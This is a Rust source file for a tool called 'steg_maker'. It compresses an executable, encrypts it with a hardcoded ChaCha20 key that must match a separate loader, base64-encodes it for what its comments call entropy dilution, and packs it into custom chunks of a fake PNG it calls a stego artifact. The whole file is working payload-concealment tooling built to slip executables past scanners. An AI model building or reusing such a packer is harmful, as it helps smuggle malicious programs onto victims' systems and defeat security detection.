use std::fs::File;
use std::io::{Read, Write};
use std::env;
use flate2::write::DeflateEncoder;
use flate2::Compression;
use chacha20::ChaCha20;
use chacha20::cipher::{KeyIvInit, StreamCipher};
use base64::{Engine as _, engine::general_purpose};

// Encryption Key (Must match mod.rs)
const KEY: [u8; 32] = [
    0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF,
    0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10,
    0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
    0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00
];
const NONCE: [u8; 12] = [0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B];

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        eprintln!("Usage: steg_maker <input_exe> <output_png>");
        return;
    }

    let input_path = &args[1];
    let output_path = &args[2];

    let mut input_data = Vec::new();
    let file_res = File::open(input_path);
    if file_res.is_err() {
        eprintln!("Cannot open input file: {}", input_path);
        return;
    }
    file_res.unwrap().read_to_end(&mut input_data).expect("Cannot read input file");

    println!("Original Size: {} bytes", input_data.len());

    // STEP 1: Compress (ZLib)
    let compressed = {
        let mut encoder = DeflateEncoder::new(Vec::new(), Compression::best());
        encoder.write_all(&input_data).expect("Compression failed");
        encoder.finish().expect("Compression finish failed")
    };
    println!("Compressed Size: {} bytes", compressed.len());

    // STEP 2: Encrypt (ChaCha20) -> High Entropy
    let mut encrypted = compressed.clone();
    let mut cipher = ChaCha20::new(&KEY.into(), &NONCE.into());
    cipher.apply_keystream(&mut encrypted);

    // STEP 3: Encode (Base64) -> Entropy Dilution
    let b64_string = general_purpose::STANDARD.encode(&encrypted);
    let b64_bytes = b64_string.as_bytes();
    println!("Base64 Size: {} bytes (Entropy Diluted)", b64_bytes.len());

    // Header: "PZ64" + Original Size (u32 little endian)
    let mut payload = Vec::new();
    payload.extend_from_slice(b"PZ64");
    payload.extend_from_slice(&(input_data.len() as u32).to_le_bytes());
    payload.extend_from_slice(b64_bytes);

    // Build PNG
    let mut png_data = Vec::new();
    // Signature
    png_data.extend_from_slice(&[137, 80, 78, 71, 13, 10, 26, 10]);
    
    // IHDR
    // We calculate height based on payload size
    let width = 1024u32;
    let height = ((payload.len() as u32) / 1024) + 1;
    let mut ihdr_data = Vec::new();
    ihdr_data.extend_from_slice(&width.to_be_bytes());
    ihdr_data.extend_from_slice(&height.to_be_bytes());
    ihdr_data.extend_from_slice(&[8, 2, 0, 0, 0]); // 8-bit RGB
    write_chunk(&mut png_data, b"IHDR", &ihdr_data);

    // Custom Chunks "biLn" (Billion? BinaryLine?)
    for chunk in payload.chunks(65536) {
        write_chunk(&mut png_data, b"biLn", chunk);
    }

    // IEND
    write_chunk(&mut png_data, b"IEND", &[]);

    let mut out_file = File::create(output_path).expect("Cannot create output file");
    out_file.write_all(&png_data).expect("Cannot write output file");

    println!("Success! PNG Stego Artifact created at: {}", output_path);
}

fn write_chunk(vec: &mut Vec<u8>, type_code: &[u8; 4], data: &[u8]) {
    vec.extend_from_slice(&(data.len() as u32).to_be_bytes());
    vec.extend_from_slice(type_code);
    vec.extend_from_slice(data);
    // CRC (Zero for simplicity - decoders might skip it or we are just ignoring it)
    vec.extend_from_slice(&0u32.to_be_bytes()); 
}
